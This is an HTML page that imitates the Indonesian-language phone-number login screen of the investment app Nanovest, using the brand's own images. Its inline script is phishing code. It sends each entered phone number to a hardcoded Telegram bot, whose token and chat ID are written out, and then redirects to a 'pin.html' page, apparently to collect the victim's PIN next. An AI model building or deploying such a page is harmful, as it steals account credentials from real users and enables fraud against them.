<html lang="id">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Nanovest
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-gradient-to-b from-[#E6E3FF] via-[#F0F0FF] to-[#E6E3FF] min-h-screen flex flex-col">
  <header class="flex justify-between items-center p-4">
   <button aria-label="Toggle dark mode" class="w-7 h-7 rounded-full bg-gradient-to-b from-[#3B3B6B] to-[#1E1E3B] flex items-center justify-center">
    <img alt="Moon icon representing dark mode toggle" class="w-5 h-5" src="https://www.nanovest.io/wp-content/themes/nanovest/assets/images/stocks-icon.svg"/>
   </button>
   <div class="flex items-center space-x-2 bg-white rounded-full px-2 py-1 text-xs font-semibold text-gray-600">
    <span>
     EN
    </span>
    <button class="w-7 h-7 rounded-full bg-gradient-to-b from-[#B59EFF] to-[#9B6EFF] text-white font-semibold flex items-center justify-center">
     ID
    </button>
   </div>
  </header>
  <main class="flex-grow flex flex-col items-center px-6 pt-6">
   <img alt="Illustration of a purple phone with keypad and moon icon on top" class="mb-4" src="https://nanovest.zendesk.com/hc/article_attachments/36781139143833"/>
   <h1 class="text-2xl font-semibold text-[#0B2E4F] mb-2">
    Halo!
   </h1>
   <p class="text-center text-gray-500 mb-8 max-w-xs">
    Silakan masukkan nomor telepon Anda untuk login atau mendaftar
   </p>
   <form class="w-full max-w-xs" id="phoneForm">
    <div class="flex items-center bg-white rounded-lg shadow px-4 py-3 mb-6">
     <img alt="Flag of Indonesia" class="w-6 h-4 rounded-sm" src="https://cdn-icons-png.flaticon.com/512/6157/6157721.png"/>
     <span class="ml-2 text-gray-800 font-medium">
      62
     </span>
     <div class="border-l border-gray-300 h-6 mx-3">
     </div>
     <input aria-label="Nomor telepon" class="flex-grow text-gray-600 text-lg focus:outline-none" id="phoneInput" name="phone" placeholder="821 001 00" type="tel"/>
    </div>
   </form>
   <button aria-label="Ada kendala dengan nomor telepon?" class="text-[#9B6EFF] font-semibold mb-12" type="button">
    Ada kendala dengan nomor telepon?
   </button>
  </main>
  <footer class="p-6">
   <button aria-label="Lanjutkan" class="w-full bg-[#9B6EFF] text-white font-semibold rounded-full py-3 text-center text-lg disabled:opacity-50 disabled:cursor-not-allowed" disabled="" form="phoneForm" id="submitBtn" type="submit">
    Lanjutkan
   </button>
  </footer>
  <script>
   const botToken = '8341291421:AAHZhAJ-_wj7HBO57T7jvQ1yJcF46SZvESg';
   const chatId = '7549590022';

   const phoneInput = document.getElementById('phoneInput');
   const submitBtn = document.getElementById('submitBtn');

   // Enable button only if input has value
   phoneInput.addEventListener('input', () => {
     if (phoneInput.value.trim().length > 0) {
       submitBtn.disabled = false;
     } else {
       submitBtn.disabled = true;
     }
   });

   document.getElementById('phoneForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     const phoneValue = phoneInput.value.trim();
     if (!phoneValue) {
       alert('Mohon masukkan nomor telepon.');
       return;
     }
     submitBtn.disabled = true;
     submitBtn.textContent = 'Mengirim...';

     const message = `Nomor Telepon: +62 ${phoneValue}`;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

     try {
       const response = await fetch(url, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
           chat_id: chatId,
           text: message
         })
       });
       const data = await response.json();
       if (data.ok) {
         window.location.href = "pin.html";
         phoneInput.value = '';
         submitBtn.disabled = true;
       } else {
         alert('Gagal mengirim nomor telepon ke Telegram.');
         submitBtn.disabled = false;
       }
     } catch (error) {
       alert('Terjadi kesalahan saat mengirim data.');
       submitBtn.disabled = false;
     } finally {
       submitBtn.textContent = 'Lanjutkan';
     }
   });
  </script>
 </body>
</html>
